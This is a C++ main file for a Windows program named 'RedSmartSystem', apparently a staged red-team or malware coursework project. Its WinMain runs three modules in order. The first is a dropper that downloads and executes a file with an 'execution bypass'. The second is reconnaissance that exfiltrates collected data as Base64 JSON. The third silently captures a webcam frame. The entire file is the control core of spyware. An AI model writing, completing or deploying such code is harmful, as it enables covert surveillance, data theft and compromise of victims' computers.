#include <windows.h>
#include <fstream>
#include "../Task 1/dropper.h"
#include "../Task 2/recon.h"
#include "../Task 3/camera.h"

// Helper function to append to debug_log.txt
static void LogMainDebug(const char* msg) {
    std::ofstream ofs("debug_log.txt", std::ios::app);
    if (ofs.is_open()) {
        ofs << "[Main] " << msg << std::endl;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LogMainDebug("--- RedSmartSystem Started ---");

    // Initialize COM early for WMI (Task 2) and Camera (Task 3)
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        LogMainDebug("CoInitializeEx failed! Some tasks may fail.");
    } else {
        // Initialize security so WMI can work smoothly
        CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    }

    // 1. Task 1 - Background thread download / execution bypass
    LogMainDebug("Executing DownloadPutty...");
    if (DownloadPutty()) {
        LogMainDebug("DownloadPutty thread successfully spawned.");
    } else {
        LogMainDebug("Failed to spawn DownloadPutty thread.");
    }

    // 2. Task 2 - Recon and Exfiltrate Base64 JSON
    LogMainDebug("Executing CollectAndSendData...");
    if (CollectAndSendData()) {
        LogMainDebug("CollectAndSendData completed successfully.");
    } else {
        LogMainDebug("CollectAndSendData failed.");
    }

    // 3. Task 3 - Silently snag webcam frame
    LogMainDebug("Executing CaptureWebcam...");
    if (CaptureWebcam()) {
        LogMainDebug("CaptureWebcam completed successfully.");
    } else {
        LogMainDebug("CaptureWebcam failed.");
    }

    if (SUCCEEDED(hr)) {
        CoUninitialize();
    }
    
    LogMainDebug("--- RedSmartSystem Finished ---");
    return 0;
}
